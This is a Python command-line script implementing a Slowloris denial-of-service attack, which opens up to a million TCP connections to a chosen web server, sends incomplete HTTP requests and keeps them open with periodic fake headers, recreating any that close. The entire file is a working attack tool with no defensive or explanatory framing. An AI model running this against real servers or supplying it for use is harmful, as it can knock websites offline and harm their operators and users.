import argparse
import logging
import threading
import time
import socket
import random

def create_socket(target, port):
    """Create and connect a socket to the target."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)
        sock.connect((target, port))

        # Send initial HTTP request
        sock.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode('utf-8'))
        sock.send(b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n")
        return sock
    except socket.error as e:
        logging.error(f"Failed to create socket: {e}")
        return None

def keep_alive(sock, interval):
    """Keep the socket alive by sending periodic headers."""
    try:
        while True:
            # Send a fake header to keep connection open
            header = f"X-CanYouFindMe-{random.randint(1, 5000)} coolant\r\n".encode('utf-8')
            sock.send(header)
            logging.debug(f"Sent keep-alive header: {header.decode().strip()}")
            time.sleep(interval)
    except socket.error:
        logging.warning("Socket closed by server or error occurred")
        return

def attack(target, port=80, interval=1, duration=1000000, socketCount=1000000):
    """Slow Loris Attack"""
    print('-------Starting attack-------')

    # Convert parameters to integers
    socketCount = int(socketCount)
    interval = int(interval)
    port = int(port)
    duration = int(duration)

    sockets = []

    # Create multiple sockets
    print(f'Creating {socketCount} sockets to {target} on {port}')
    for i in range(socketCount):
        sock = create_socket(target, port)
        
        if sock:
            sockets.append(sock)
            print(f"Socket {i+1} created")
        else:
            print(f"Socket {i+1} creation failed")
    
    # Start keep-alive thread for each socket
    threads = []
    for sock in sockets:
        createThread = threading.Thread(target=keep_alive, args=(sock, interval))
        createThread.daemon = True
        createThread.start()
        threads.append(createThread)
    
    # Run attack
    print(f'Running attack for {duration} seconds')
    start_time = time.time()
    while time.time() - start_time < duration:
        # Maintain socket count by replacing closed sockets
        for i, sock in enumerate(sockets):
            try:
                sock.send(b" \r\n")  # Test if socket is still alive
            except socket.error:
                print(f"Socket {i+1} closed, recreating...")
                sockets[i] = create_socket(target, port)
                if sockets[i]:
                    t = threading.Thread(target=keep_alive, args=(sockets[i], interval))
                    t.daemon = True
                    t.start()
                    threads[i] = t
                else:
                    sockets[i] = None
        time.sleep(1)
    
    print("Cleaning up sockets...")
    for sock in sockets:
        if sock:
            try:
                sock.close()
            except socket.error:
                pass
    logging.info("Attack completed")

def main():
    # Parameter configuration 
    par = argparse.ArgumentParser(description="Bare minimum Slow Loris")
    par.add_argument('-t', "--target", type=str, help="Target IP of the webserver", required=True)
    par.add_argument('-p', "--port", help="Port which web server is running (default 80)", default=80)
    par.add_argument('-i', "--interval", help="Interval on keep-alive headers (seconds) (default 1)", default=1)
    par.add_argument('-d', "--duration", help="How long the attack will run (seconds) (default 1 million)", default=1000000)
    par.add_argument('-s', "--socketCount", help="How many sockets to create (default 1 million)", default=1000000)
    
    args = par.parse_args()

    print("Attack Information")
    print(f"Target: {args.target}")
    print(f"Port: {args.port}")
    print(f"Interval: {args.interval}")
    print(f"Duration: {args.duration}")
    print(f"Number of sockets: {args.socketCount}")

    attack(args.target, args.port, args.interval, args.duration, args.socketCount)

if __name__ == "__main__":
    main()